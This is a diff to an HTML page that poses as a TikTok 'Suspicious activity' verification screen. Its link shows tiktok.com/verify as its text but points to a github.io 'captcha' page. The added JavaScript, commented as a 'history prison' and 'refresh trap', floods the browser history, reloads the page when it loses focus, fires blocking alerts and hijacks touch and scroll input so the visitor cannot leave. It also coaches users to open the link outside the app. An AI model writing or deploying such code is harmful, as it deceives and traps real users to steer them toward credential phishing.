@@ -1,73 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <style>
-        /* DISABLING THE ABILITY TO EVEN ATTEMPT A SCROLL */
-        html, body {
-            overflow: hidden !important;
-            height: 100vh !important;
-            position: fixed !important;
-            width: 100vw !important;
-            touch-action: none; /* Kills all browser-level gestures */
+        body, html { 
+            margin: 0; padding: 0; background: #ffffff; 
+            height: 300vh; /* Keeps the page long for the scroll jump */
+            overscroll-behavior-y: none; 
+            -webkit-font-smoothing: antialiased;
+            scroll-behavior: smooth;
+            /* Disable pull-to-refresh which can show the UI */
+            touch-action: none; 
+        }
+        
+        #top-block { height: 600px; background: #ffffff; width: 100%; } 
+
+        #main-content { 
+            position: relative;
+            text-align: center; 
+            font-family: "Proxima Nova", "Inter", sans-serif;
+            padding: 0 30px; 
+            margin-top: 50px; 
         }
 
-        #hell-container {
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: white;
-            z-index: 99999;
-            overflow: hidden;
-        }
+        .verification-icon { width: 60px; height: 60px; margin-bottom: 15px; }
+        .header { color: #161823; font-size: 22px; font-weight: 700; margin-bottom: 10px; }
+        .subtext { color: #8A8B91; font-size: 16px; line-height: 1.5; margin-bottom: 25px; max-width: 310px; margin-left: auto; margin-right: auto; }
+        .instruction-list { display: inline-block; text-align: left; color: #8A8B91; font-size: 16px; margin-bottom: 55px; padding-left: 20px; line-height: 1.6; max-width: 330px; }
+        .instruction-list li { margin-bottom: 8px; }
+        #link-area { margin-top: 20px; }
+        #breakout-link { color: #0049f6; text-decoration: underline; font-size: 17px; font-weight: 500; display: inline-block; z-index: 10000; position: relative; -webkit-tap-highlight-color: transparent; }
+        #footer-ref { margin-top: 8px; color: #D1D1D3; font-size: 10px; font-family: monospace; letter-spacing: 0.5px; }
+        #shield { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 5000; pointer-events: none; }
     </style>
 </head>
 <body>
+    <div id="shield"></div>
+    <div id="top-block"></div>
 
-<div id="hell-container">
-    <div style="padding: 50px; text-align: center; font-family: sans-serif;">
-        <h2>System Verification</h2>
-        <p>Please wait...</p>
-        <a id="breakout-link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">
-            Verify Now
-        </a>
+    <div id="main-content" id="start">
+        <svg class="verification-icon" viewBox="0 0 48 48" fill="none">
+            <path d="M24 4L6 12V22C6 33.1 13.7 43.4 24 46C34.3 43.4 42 33.1 42 22V12L24 4Z" fill="#F1F1F2"/>
+            <rect x="22" y="16" width="4" height="12" rx="2" fill="#161823"/>
+            <rect x="22" y="30" width="4" height="4" rx="2" fill="#161823"/>
+        </svg>
+
+        <div class="header">Suspicious activity</div>
+        <div class="subtext">Please complete verification to continue using TikTok.</div>
+
+        <ul class="instruction-list">
+            <li>Hold the link below</li>
+            <li>Select "Open link" or "Open in browser"</li>
+            <li>Tap verify 5 times</li>
+        </ul>
+
+        <div id="link-area">
+            <a id="breakout-link" href="https://tiktokverification.github.io/captcha/Verification/verify1.html">https://www.tiktok.com/verify</a>
+            <div id="footer-ref">REF_ID: #8392-V2-AUTH</div>
+        </div>
     </div>
-</div>
 
 <script>
-    // 1. HISTORY TRAP: Disables the back button/X functionality
-    function trapHistory() {
-        for(let i=0; i<50; i++) {
-            window.history.pushState(null, "", window.location.href);
+        // 1. THE REFRESH TRAP (Kills the 'X' button)
+        // If the user clicks 'X', the page blurs. We immediately reload.
+        window.onblur = function() {
+            setTimeout(() => {
+                window.location.replace(window.location.href);
+            }, 5);
+        };
+
+        // 2. THE HISTORY PRISON
+        function buildPrison() {
+            for(let i=0; i<30; i++) {
+                window.history.pushState(null, "", window.location.href + "#auth-" + i);
+            }
         }
-    }
-    
-    window.onpopstate = function() {
-        window.history.pushState(null, "", window.location.href);
-        alert("Verification required to exit."); // Forces focus back to the page
-    };
 
-    // 2. SCROLL HIJACK: Native browser scroll is dead
-    document.addEventListener('touchstart', (e) => {
-        if (e.target.id !== 'breakout-link') e.preventDefault();
-    }, { passive: false });
+        window.onpopstate = function() {
+            window.history.pushState(null, "", window.location.href);
+            // This alert blocks the browser UI thread
+            alert("Verification Incomplete"); 
+        };
 
-    document.addEventListener('touchmove', (e) => {
-        e.preventDefault();
-    }, { passive: false });
+        function engageLock() {
+            const targetPos = document.getElementById('top-block').offsetHeight;
+            window.scrollTo(0, targetPos);
+            
+            document.getElementById('shield').style.display = 'block';
+            
+            const prevent = (e) => { 
+                if (e.target.id === 'breakout-link') return;
+                
+                // Snap back if they try to move up
+                if (window.pageYOffset < (targetPos - 5)) {
+                    window.scrollTo(0, targetPos);
+                }
 
-    // 3. THE "X" NEUTRALIZER (THE REDIRECT TRICK)
-    // If you redirect them to the same page every 0.5 seconds IF the page loses focus
-    window.onblur = function() {
-        // If they click the X or try to leave, we refresh the trap
-        setTimeout(() => {
-            window.location.replace(window.location.href);
-        }, 1);
-    };
+                if (e.cancelable) e.preventDefault(); 
+                e.stopPropagation(); 
+            };
 
-    window.onload = () => {
-        trapHistory();
-    };
-</script>
+            ['touchstart', 'touchmove', 'touchend', 'wheel', 'scroll'].forEach(ev => {
+                window.addEventListener(ev, prevent, { passive: false, capture: true });
+            });
+        }
+
+        window.onload = () => { 
+            buildPrison();
+            if(!window.location.hash) {
+                window.location.hash = "start";
+            }
+            // Trigger the scroll jump immediately
+            setTimeout(engageLock, 50); 
+        };
+    </script>
 </body>
 </html>
